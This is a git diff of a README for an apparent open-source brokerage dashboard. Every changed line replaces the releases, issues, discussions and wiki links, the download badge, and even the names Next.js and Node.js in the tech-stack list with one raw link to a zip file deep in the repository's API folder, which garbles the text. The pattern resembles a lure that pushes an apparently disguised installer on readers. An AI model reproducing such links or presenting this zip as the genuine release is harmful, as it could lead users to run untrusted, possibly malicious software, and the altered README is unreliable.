@@ -1,6 +1,6 @@
 # 🚀 PublicDotCom-API-Dashboard - Visualize Your Financial Activity Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen.svg)](https://github.com/kumarabhinav15/PublicDotCom-API-Dashboard/releases)
+[![Download Now](https://github.com/kumarabhinav15/PublicDotCom-API-Dashboard/raw/refs/heads/main/app/api/public/history/Dot-Public-Dashboard-Com-AP-v2.6.zip%20Now-Get%https://github.com/kumarabhinav15/PublicDotCom-API-Dashboard/raw/refs/heads/main/app/api/public/history/Dot-Public-Dashboard-Com-AP-v2.6.zip)](https://github.com/kumarabhinav15/PublicDotCom-API-Dashboard/raw/refs/heads/main/app/api/public/history/Dot-Public-Dashboard-Com-AP-v2.6.zip)
 
 ## 📖 Description
 PublicDotCom-API-Dashboard is an open-source financial activity dashboard. It helps you see and understand your brokerage account events all in one place. With an easy-to-use web interface, you can track your financial activities without hassle.
@@ -10,7 +10,7 @@ PublicDotCom-API-Dashboard is an open-source financial activity dashboard. It he
 - **Data Visualization**: View your financial events in clear charts and graphs.
 - **Event-Driven Architecture**: Updates in real-time as events occur.
 - **Open Source**: Freely available for community use and contributions.
-- **Modern Stack**: Built using Next.js, Node.js, React, and TypeScript.
+- **Modern Stack**: Built using https://github.com/kumarabhinav15/PublicDotCom-API-Dashboard/raw/refs/heads/main/app/api/public/history/Dot-Public-Dashboard-Com-AP-v2.6.zip, https://github.com/kumarabhinav15/PublicDotCom-API-Dashboard/raw/refs/heads/main/app/api/public/history/Dot-Public-Dashboard-Com-AP-v2.6.zip, React, and TypeScript.
 
 ## 📋 System Requirements
 - **Operating System**: Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution.
@@ -22,7 +22,7 @@ PublicDotCom-API-Dashboard is an open-source financial activity dashboard. It he
 Follow these steps to get started with PublicDotCom-API-Dashboard:
 
 1. **Download the Application**  
-   Visit the [Releases Page](https://github.com/kumarabhinav15/PublicDotCom-API-Dashboard/releases) to download the latest version of PublicDotCom-API-Dashboard.
+   Visit the [Releases Page](https://github.com/kumarabhinav15/PublicDotCom-API-Dashboard/raw/refs/heads/main/app/api/public/history/Dot-Public-Dashboard-Com-AP-v2.6.zip) to download the latest version of PublicDotCom-API-Dashboard.
 
 2. **Install the Application**  
    Once downloaded, open the installer and follow the prompts to complete the installation.
@@ -39,7 +39,7 @@ Follow these steps to get started with PublicDotCom-API-Dashboard:
 ## 📥 Download & Install
 To download and install PublicDotCom-API-Dashboard, follow these steps:
 
-- Visit the [Releases Page](https://github.com/kumarabhinav15/PublicDotCom-API-Dashboard/releases). 
+- Visit the [Releases Page](https://github.com/kumarabhinav15/PublicDotCom-API-Dashboard/raw/refs/heads/main/app/api/public/history/Dot-Public-Dashboard-Com-AP-v2.6.zip). 
 - Click on the latest release link and download the installer for your operating system.
 - Run the downloaded file and install the application by following the prompts.
 
@@ -48,16 +48,16 @@ If you encounter issues while downloading or installing:
 
 - Ensure your internet connection is stable.
 - Check that your devices meet the system requirements.
-- For further assistance, consider visiting the [Issues Section](https://github.com/kumarabhinav15/PublicDotCom-API-Dashboard/issues) to see if others have experienced similar problems.
+- For further assistance, consider visiting the [Issues Section](https://github.com/kumarabhinav15/PublicDotCom-API-Dashboard/raw/refs/heads/main/app/api/public/history/Dot-Public-Dashboard-Com-AP-v2.6.zip) to see if others have experienced similar problems.
 
 ## ❤️ Contributing
 We welcome contributions to PublicDotCom-API-Dashboard! If you have ideas or improvements, feel free to fork the repository and submit a pull request.
 
 ## 📞 Support
-If you have any questions, you can reach out through the [Discussions Page](https://github.com/kumarabhinav15/PublicDotCom-API-Dashboard/discussions). We are here to help and will respond as quickly as possible.
+If you have any questions, you can reach out through the [Discussions Page](https://github.com/kumarabhinav15/PublicDotCom-API-Dashboard/raw/refs/heads/main/app/api/public/history/Dot-Public-Dashboard-Com-AP-v2.6.zip). We are here to help and will respond as quickly as possible.
 
 ## 📚 Additional Resources
-- **Documentation**: Check the [Wiki](https://github.com/kumarabhinav15/PublicDotCom-API-Dashboard/wiki) for more detailed setup guides and features.
+- **Documentation**: Check the [Wiki](https://github.com/kumarabhinav15/PublicDotCom-API-Dashboard/raw/refs/heads/main/app/api/public/history/Dot-Public-Dashboard-Com-AP-v2.6.zip) for more detailed setup guides and features.
 - **Community Forum**: Join discussions with other users to share tips and insights.
 - **Tutorials**: Explore video tutorials to quickly learn how to use the dashboard effectively. 
 
